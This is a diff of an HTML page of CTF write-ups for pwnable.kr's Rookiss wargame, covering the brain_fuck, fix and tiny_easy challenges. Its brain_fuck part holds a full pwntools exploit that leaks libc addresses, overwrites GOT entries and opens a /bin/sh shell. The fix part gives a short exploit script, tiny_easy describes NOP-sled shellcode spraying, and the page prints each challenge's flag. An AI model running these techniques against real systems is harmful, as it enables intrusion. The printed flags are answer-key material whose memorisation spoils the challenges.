@@ -4,8 +4,15 @@
     <meta charset='utf-8'>
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1">
-    <link rel="stylesheet" href="/CTF_writeups/assets/css/style.css?v=b7c7ae198d0c0d5b433ba2f5ba28241351a2fd21">
-    <link rel="shortcut icon" type="image/x-icon" href="/CTF_writeups/favicon.ico">
+    <link rel="stylesheet" href="/CTF_writeups/assets/css/style.css?v=429416b0fbd88183bc1fba2235ca959bf77e17b2">
+    
+<link rel="shortcut icon" type="image/x-icon" href="/CTF_writeups/favicon.ico">
+
+<!-- remove the cache headers -->
+<meta http-equiv="Cache-Control" content="no-cache, no-store, must-revalidate">
+<meta http-equiv="Pragma" content="no-cache">
+<meta http-equiv="Expires" content="0">
+
 
 <!-- Begin Jekyll SEO tag v2.8.0 -->
 <title>Rookiss Writeups | Avishai’s CTF Writeups</title>
@@ -44,26 +51,323 @@
 
     <div class="container">
       <section id="main_content">
-        <p>This folder contains solutions for the <a href="http://overthewire.org/wargames/Rookiss/">Rookiss</a> wargame from OverTheWire.</p>
+        <p><a href="/CTF_writeups/pwnable.kr/" style="display:inline-block; margin-bottom: 1rem; text-decoration: none; color: #16a085; font-weight: bold;">
+      ← Back to pwnable.kr
+    </a></p>
+
+<p>##s for the <a href="http://pwnable.kr/Rookiss/">Rookiss</a> wargame from Pwnable.kr.</p>
 
 <style>
-/* Styles same as your Behemoth example – omitted here for brevity */
+  body {
+    font-family: 'Arial', sans-serif;
+    background-color: #eceff1;
+    color: #333;
+    margin: 0;
+  }
+  #main {
+    max-width: 100% !important;
+    width: 100% !important;
+    margin: 0 auto;
+  }
+  .Rookiss-container {
+    display: flex;
+    gap: 1.5rem;
+    margin-top: 2rem;
+    padding: 1rem;
+  }
+  .Rookiss-sidebar {
+    min-width: 200px;
+    max-height: 90vh;
+    overflow-y: auto;
+    position: sticky;
+    top: 1rem;
+    padding: 1.5rem;
+    border-radius: 8px;
+    background-color: #34495e;
+    box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
+    color: #ecf0f1;
+    margin-top: 1rem;
+  }
+  .Rookiss-sidebar h00 {
+    font-size: 1.2rem;
+    font-weight: 600;
+    margin-bottom: 1.5rem;
+    color: #ecf0f1;
+    border-bottom: 2px solid #16a085;
+    padding-bottom: 0.5rem;
+  }
+  .Rookiss-sidebar ul {
+    list-style: none;
+    padding-left: 0;
+    font-size: 1rem;
+    margin: 0;
+  }
+  .Rookiss-sidebar li {
+    margin-bottom: 0.5rem;
+  }
+  .Rookiss-sidebar a {
+    display: block;
+    padding: 6px 12px;
+    border-radius: 6px;
+    text-decoration: none;
+    color: #ecf0f1;
+    transition: background 0.3s ease, color 0.3s ease;
+  }
+  .Rookiss-sidebar a:hover {
+    background-color: #16a085;
+    color: #fff;
+  }
+  .Rookiss-content {
+    flex: 1;
+    max-height: 90vh;
+    overflow-y: auto;
+    padding-right: 1rem;
+    background-color: #ffffff;
+    border-radius: 8px;
+    box-shadow: 0 4px 6px rgba(0, 0, 0, 0.05);
+    padding: 2rem;
+    font-size: 1rem;
+    color: #333;
+    margin-top: 1rem;
+  }
+  .Rookiss-content h00 {
+    font-size: 1.4rem;
+    font-weight: 600;
+    margin-top: 2rem;
+    color:rgb(143, 151, 159);
+    scroll-margin-top: 100px;
+  }
+  hr {
+    margin: 2.5rem 0;
+    border: none;
+    border-top: 1px solid #ddd;
+  }
+  .Rookiss-sidebar::-webkit-scrollbar {
+    width: 8px;
+  }
+  .Rookiss-sidebar::-webkit-scrollbar-thumb {
+    background-color: #16a085;
+    border-radius: 4px;
+  }
+  .Rookiss-sidebar::-webkit-scrollbar-track {
+    background-color: #ecf0f1;
+  }
+  @media (max-width: 768px) {
+    .Rookiss-container {
+      flex-direction: column;
+    }
+    .Rookiss-sidebar {
+      max-height: none;
+      width: 100%;
+      margin-bottom: 2rem;
+    }
+  }
+  .level-banner {
+    background-color: #16a085;
+    color: #fff;
+    padding: 1rem;
+    text-align: center;
+    font-weight: bold;
+    margin-top: 2rem;
+    border-radius: 8px;
+  }
 </style>
 
-<div class="behemoth-container">
+<div class="Rookiss-container">
 
   <!-- Sidebar -->
-  <div class="behemoth-sidebar">
+  <div class="Rookiss-sidebar">
     <h00>Levels</h00>
     <ul>
       
       
       
+        
+        
+          <li><a href="#brain_fuck">brain_fuck</a></li>
+        
+      
+        
+        
+          <li><a href="#fix">fix</a></li>
+        
+      
+        
+        
+      
+        
+        
+          <li><a href="#tiny_easy">tiny_easy</a></li>
+        
+      
     </ul>
   </div>
 
   <!-- Main content -->
-  <div class="behemoth-content">
+  <div class="Rookiss-content">
+    
+      
+      
+        <h00 id="brain_fuck">brain_fuck</h00>
+        <p>in this challenge we give payload that override the plt table in 3 different places, in memset -&gt; gets
+in fgets -&gt; system
+and in putchar -&gt; main.</p>
+
+<p>then, we send “/bin/sh” that will pushed into the stack in the second run if main, in gets, and when “fgets” will be called, system(“/bin/sh”) will get executed.</p>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+
+
+<span class="n">libc</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s">'./bf_libc.so'</span><span class="p">)</span>
+<span class="n">binary</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s">'./bf'</span><span class="p">)</span>
+
+<span class="n">puts_got_addr</span> <span class="o">=</span> <span class="n">binary</span><span class="p">.</span><span class="n">got</span><span class="p">[</span><span class="s">'puts'</span><span class="p">]</span>
+<span class="k">print</span><span class="p">(</span><span class="s">"puts_got_address: 0x{:08x}"</span><span class="p">.</span><span class="nb">format</span><span class="p">(</span><span class="n">puts_got_addr</span><span class="p">))</span>
+<span class="n">putchar_got_addr</span> <span class="o">=</span> <span class="n">binary</span><span class="p">.</span><span class="n">got</span><span class="p">[</span><span class="s">'putchar'</span><span class="p">]</span>
+<span class="k">print</span><span class="p">(</span><span class="s">"putchar_got_addr: 0x{:08x}"</span><span class="p">.</span><span class="nb">format</span><span class="p">(</span><span class="n">putchar_got_addr</span><span class="p">))</span>
+<span class="n">memset_got_addr</span> <span class="o">=</span> <span class="n">binary</span><span class="p">.</span><span class="n">got</span><span class="p">[</span><span class="s">'memset'</span><span class="p">]</span>
+<span class="k">print</span><span class="p">(</span><span class="s">"memset_got_addr: 0x{:08x}"</span><span class="p">.</span><span class="nb">format</span><span class="p">(</span><span class="n">memset_got_addr</span><span class="p">))</span>
+<span class="n">fgets_got_addr</span> <span class="o">=</span> <span class="n">binary</span><span class="p">.</span><span class="n">got</span><span class="p">[</span><span class="s">'fgets'</span><span class="p">]</span>
+<span class="k">print</span><span class="p">(</span><span class="s">"fgets_got_addr: 0x{:08x}"</span><span class="p">.</span><span class="nb">format</span><span class="p">(</span><span class="n">fgets_got_addr</span><span class="p">))</span>
+
+<span class="n">gets_virtual_addr</span> <span class="o">=</span> <span class="n">libc</span><span class="p">.</span><span class="n">symbols</span><span class="p">[</span><span class="s">'gets'</span><span class="p">]</span>
+<span class="k">print</span><span class="p">(</span><span class="s">"gets_virtual_addr: 0x{:08x}"</span><span class="p">.</span><span class="nb">format</span><span class="p">(</span><span class="n">gets_virtual_addr</span><span class="p">))</span>
+<span class="n">system_virtual_addr</span> <span class="o">=</span> <span class="n">libc</span><span class="p">.</span><span class="n">symbols</span><span class="p">[</span><span class="s">'system'</span><span class="p">]</span>
+<span class="k">print</span><span class="p">(</span><span class="s">"system_virtual_addr: 0x{:08x}"</span><span class="p">.</span><span class="nb">format</span><span class="p">(</span><span class="n">system_virtual_addr</span><span class="p">))</span>
+<span class="n">puts_virtual_addr</span> <span class="o">=</span> <span class="n">libc</span><span class="p">.</span><span class="n">symbols</span><span class="p">[</span><span class="s">'puts'</span><span class="p">]</span>
+<span class="k">print</span><span class="p">(</span><span class="s">"puts_virtual_addr: 0x{:08x}"</span><span class="p">.</span><span class="nb">format</span><span class="p">(</span><span class="n">puts_virtual_addr</span><span class="p">))</span>
+
+<span class="n">p_address</span> <span class="o">=</span> <span class="mh">0x0804a0a0</span> 
+<span class="n">main_addr</span> <span class="o">=</span> <span class="mh">0x08048671</span>
+<span class="c1"># Connection details
+</span><span class="n">host</span> <span class="o">=</span> <span class="s">'pwnable.kr'</span>
+<span class="c1"># # host = 'localhost'
+</span><span class="n">port</span> <span class="o">=</span> <span class="mi">9001</span>
+
+<span class="c1"># context.log_level = 'debug'
+</span>
+<span class="c1"># # Establish a remote connection
+</span><span class="n">p</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="n">host</span><span class="p">,</span> <span class="n">port</span><span class="p">)</span>
+<span class="c1"># p = process('./bf')
+</span>
+<span class="n">p</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s">'type some brainfuck instructions except [ ]</span><span class="se">\n</span><span class="s">'</span><span class="p">)</span> <span class="c1"># get all begin data
+# p.recv()
+</span>
+<span class="c1"># print the real address of puts
+</span><span class="n">payload</span> <span class="o">=</span> <span class="s">"&lt;"</span> <span class="o">*</span> <span class="p">(</span><span class="n">p_address</span> <span class="o">-</span> <span class="n">puts_got_addr</span><span class="p">)</span> 
+<span class="n">payload</span> <span class="o">+=</span> <span class="s">".&gt;"</span> <span class="o">*</span> <span class="mi">4</span>
+
+<span class="c1"># override fgets_got to system
+</span><span class="n">payload</span> <span class="o">+=</span> <span class="s">"&lt;"</span> <span class="o">*</span> <span class="p">(</span><span class="n">puts_got_addr</span> <span class="o">-</span> <span class="n">fgets_got_addr</span> <span class="o">+</span> <span class="mi">4</span><span class="p">)</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="s">",&gt;"</span> <span class="o">*</span> <span class="mi">4</span> <span class="c1"># change the address of plt_fgets to system
+</span>
+<span class="c1"># override memset_got to gets
+</span><span class="n">payload</span> <span class="o">+=</span> <span class="s">"&gt;"</span> <span class="o">*</span> <span class="p">(</span><span class="n">memset_got_addr</span> <span class="o">-</span> <span class="n">fgets_got_addr</span> <span class="o">-</span> <span class="mi">4</span><span class="p">)</span> 
+<span class="n">payload</span> <span class="o">+=</span> <span class="s">",&gt;"</span> <span class="o">*</span> <span class="mi">4</span> <span class="c1"># change the address of plt_memset to gets
+</span>
+<span class="c1"># override putchar_got to main
+</span><span class="n">payload</span> <span class="o">+=</span> <span class="s">"&lt;"</span> <span class="o">*</span> <span class="p">(</span><span class="n">putchar_got_addr</span> <span class="o">-</span> <span class="n">memset_got_addr</span> <span class="o">-</span> <span class="mi">4</span><span class="p">)</span> 
+<span class="n">payload</span> <span class="o">+=</span> <span class="s">",&gt;"</span> <span class="o">*</span> <span class="mi">4</span> 
+
+<span class="c1"># call putchar, which call main
+</span><span class="n">payload</span> <span class="o">+=</span> <span class="s">"."</span>
+
+<span class="n">p</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
+
+<span class="n">inp</span> <span class="o">=</span> <span class="sa">b</span><span class="s">''</span>
+
+<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">4</span><span class="p">):</span>
+    <span class="n">inp</span> <span class="o">+=</span> <span class="n">p</span><span class="p">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
+
+<span class="n">puts_real_addr</span> <span class="o">=</span> <span class="n">u32</span><span class="p">(</span><span class="n">inp</span><span class="p">)</span>
+<span class="n">log</span><span class="p">.</span><span class="n">info</span><span class="p">(</span><span class="s">"puts_real_addr: 0x{:08x}"</span><span class="p">.</span><span class="nb">format</span><span class="p">(</span><span class="n">puts_real_addr</span><span class="p">))</span>
+<span class="n">base_addr</span> <span class="o">=</span> <span class="n">puts_real_addr</span> <span class="o">-</span> <span class="n">puts_virtual_addr</span>
+<span class="n">log</span><span class="p">.</span><span class="n">info</span><span class="p">(</span><span class="s">"base_addr: 0x{:08x}"</span><span class="p">.</span><span class="nb">format</span><span class="p">(</span><span class="n">base_addr</span><span class="p">))</span>
+
+<span class="c1"># this will go to fgets
+</span><span class="n">system_real_addr</span> <span class="o">=</span> <span class="n">base_addr</span> <span class="o">+</span> <span class="n">system_virtual_addr</span> 
+<span class="n">log</span><span class="p">.</span><span class="n">info</span><span class="p">(</span><span class="s">"system_real_addr: 0x{:08x}"</span><span class="p">.</span><span class="nb">format</span><span class="p">(</span><span class="n">system_real_addr</span><span class="p">))</span>
+<span class="n">p</span><span class="p">.</span><span class="n">send</span><span class="p">(</span><span class="n">p32</span><span class="p">(</span><span class="n">system_real_addr</span><span class="p">))</span>
+
+<span class="c1"># this will go to memset_got
+</span><span class="n">gets_real_addr</span> <span class="o">=</span> <span class="n">base_addr</span> <span class="o">+</span> <span class="n">gets_virtual_addr</span> 
+<span class="n">log</span><span class="p">.</span><span class="n">info</span><span class="p">(</span><span class="s">"gets_real_addr: 0x{:08x}"</span><span class="p">.</span><span class="nb">format</span><span class="p">(</span><span class="n">gets_real_addr</span><span class="p">))</span>
+<span class="n">p</span><span class="p">.</span><span class="n">send</span><span class="p">(</span><span class="n">p32</span><span class="p">(</span><span class="n">gets_real_addr</span><span class="p">))</span> 
+
+<span class="c1"># this will go to putchar_got
+</span><span class="n">p</span><span class="p">.</span><span class="n">send</span><span class="p">(</span><span class="n">p32</span><span class="p">(</span><span class="n">main_addr</span><span class="p">))</span> 
+
+<span class="n">p</span><span class="p">.</span><span class="n">send</span><span class="p">(</span><span class="sa">b</span><span class="s">'/bin/sh</span><span class="se">\0</span><span class="s">'</span><span class="p">)</span> <span class="c1"># put /bin/sh in the stack, using the get function
+</span>
+<span class="n">p</span><span class="p">.</span><span class="n">interactive</span><span class="p">()</span>
+
+<span class="n">p</span><span class="p">.</span><span class="n">close</span><span class="p">()</span>
+
+</code></pre></div></div>
+
+<p><img src="/CTF_writeups/pwnable.kr/Rookiss/images/fix.png" alt="image" /></p>
+
+<p><strong>Flag:</strong> <strong><em><code class="language-plaintext highlighter-rouge">BrainFuck? what a weird language..</code></em></strong></p>
+
+        <div class="level-banner">Next Level Writeup</div>
+        <hr />
+      
+    
+      
+      
+        <h00 id="fix">fix</h00>
+        <p>in this challenge we replace the <code class="language-plaintext highlighter-rouge">push eax</code> with <code class="language-plaintext highlighter-rouge">pop esp</code>, and by this way we push the value of ebx to somewhere in the stack, to <em>0x62696e2f</em>, which is equivalent to the string <em>bin\</em>.</p>
+
+<p>if we want to stack to work in <em>0x62696e2f</em> we need to enable it, by executing this line: <code class="language-plaintext highlighter-rouge">ulimit -s unlimited</code>.</p>
+
+<p>then, we need to push to byte 15 the value 92, which is 0x5c, which is <code class="language-plaintext highlighter-rouge">pop esp</code>.</p>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">#!/usr/bin/python
+</span><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+
+<span class="n">context</span><span class="p">.</span><span class="n">log_level</span> <span class="o">=</span> <span class="s">'debug'</span>
+
+<span class="n">path</span> <span class="o">=</span> <span class="s">'./fix'</span>
+
+<span class="n">p</span> <span class="o">=</span> <span class="n">process</span><span class="p">(</span><span class="n">path</span><span class="p">)</span>
+
+<span class="c1"># p.recv()
+</span><span class="n">p</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="s">'15'</span><span class="p">)</span>
+<span class="c1"># p.recv()
+</span><span class="n">p</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="s">'92'</span><span class="p">)</span>
+
+<span class="c1">#  p.log("send values")
+</span>
+<span class="n">p</span><span class="p">.</span><span class="n">interactive</span><span class="p">()</span>
+
+</code></pre></div></div>
+
+<p><img src="/CTF_writeups/pwnable.kr/Rookiss/images/fix.png" alt="image" /></p>
+
+<p><strong>Flag:</strong> <strong><em><code class="language-plaintext highlighter-rouge">Sorry for blaming shell-strom.org :) it was my ignorance!</code></em></strong></p>
+
+        <div class="level-banner">Next Level Writeup</div>
+        <hr />
+      
+    
+      
+      
+    
+      
+      
+        <h00 id="tiny_easy">tiny_easy</h00>
+        <p>in this challenge, we spam the stack with our shellcode, and hope that in arg1 we’ll put address that’ll fall exactly on NOP bytes, and by this way execute our shellcode.</p>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="p">{</span><span class="o">%</span> <span class="n">include_relative</span> <span class="n">scripts</span><span class="o">/</span><span class="n">tiny_easy</span><span class="o">/</span><span class="n">tiny_easy</span><span class="p">.</span><span class="n">py</span> <span class="o">%</span><span class="p">}</span>
+</code></pre></div></div>
+
+<p><img src="/CTF_writeups/pwnable.kr/Rookiss/images/tiny_easy.png" alt="image" /></p>
+
+<p><strong>Flag:</strong> <strong><em><code class="language-plaintext highlighter-rouge">What a tiny task :) good job!</code></em></strong></p>
+
+        <div class="level-banner">Next Level Writeup</div>
+        <hr />
+      
     
   </div>
 
